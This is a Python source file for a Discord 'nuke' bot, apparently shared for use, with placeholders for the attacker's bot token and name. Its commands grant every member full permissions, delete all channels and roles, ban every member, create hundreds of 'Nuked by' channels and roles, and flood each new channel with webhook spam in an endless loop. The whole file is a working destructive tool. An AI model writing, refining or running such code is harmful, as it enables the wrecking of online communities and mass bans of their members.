#Discord Nuke bot 

#Made by the GregSec


#enter bot token here
token = "Token Goes here"

#enter your bot's prefix here
prefix = '>>'

#enter your name or clan/group here
name = "Put your name here"

##enter your message here
message = "@everyone put your message here"

#Modules 
import discord
from discord.ext import commands
import colorama 
from colorama import *
from discord import Webhook, AsyncWebhookAdapter
import aiohttp

#Code
client = commands.Bot(command_prefix=prefix, help_command=None, Selfbot=False)
@client.event
async def on_ready():
  print(Fore.BLUE + f"""
===============================================================================================================
                                            ____    _     __     _    ____
                                           |####`--|#|---|##|---|#|--'##|#|
         _                                 |____,--|#|---|##|---|#|--.__|_|
       _|#)_____________________________________,--'Made By GregSec'_=-.
      ((_____((_________________________,--------[JW](___(____(____(_==)        _________
                                     .--|##,----o  o  o  o  o  o  o__|/`---,-,-'=========`=+==.
                                     |##|_Y__,__.-._,__,  __,-.___/ J \ .----.#############|##|
                                     |##|              `-.|#|##|#|`===l##\   _\############|##|
                                    =======-===l          |_|__|_|     \##`-"__,=======.###|##|
                                                                        \__,"          '======'
===============================================================================================================
connected to: {client.user}

Your Bots OAuth2 Link: https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot

Your Prefix is: {prefix}

===============================================================================================================

{prefix}nuke: Nukes the server

{prefix}chandel: deletes all channels

{prefix}roledel: deletes all roles

===============================================================================================================

""")

#Nukes server
@client.command()
async def nuke(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

async def nuke(guild):
  print(f"Obliterating {guild.name}.")
  try:
    role = discord.utils.get(guild.roles, name = "@everyone")

  except:
    print("couldnt give perms")

  await role.edit(permissions = discord.Permissions.all())

  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"Deleted {channel.name}")
    except:
      print(f"{channel.name} hasn't been deleted.")

  for member in guild.members:
    try:
      await member.ban()
      print(f"Banned {member.name}")
    except:
      print(f"{member.name} hasn't been banned.")

  for i in range(500):
    try:
      await guild.create_text_channel(f"Nuked by {name}")
      print(f'created channel')
    except:
      print(f'could not make channel')
  
  for role in guild.roles:
    try:
      await role.delete()
      print("role was deleted")
    except:
      print("Could not delete role")

  for i in range(250):
    try:
      await guild.create_role(name=f"Nuked by {name}")
      print("created role")
    except:
      print("could not make role")

  for role in guild.roles:
    try:
      await role.delete()
      print("role was deleted")
    except:
      print("Could not delete role")

  for i in range(250):
    try:
      await guild.create_role(name=f"Hit by {name}")
      print("created role")
    except:
      print("could not make role")

  print(f"Eliminated {guild.name}.")

#Deletes every channel
@client.command()
async def chandel(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await chandel(guild)

async def chandel(guild):

  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"Deleted {channel.name}")
    except:
      print(f"{channel.name} hasn't been deleted.")

  print("deleted all channels")

#Deletes every channel
@client.command()
async def roledel(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await roledel(guild)

async def roledel(guild):
  for role in guild.roles:
    try:
      await role.delete()
      print(f"role was deleted")
    except:
      print("Could not delete role")

  print("deleted all roles")

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="Hail GregSec")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(
            str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
            await webhook.send(message)
            await channel.send(message)

client.run(token)
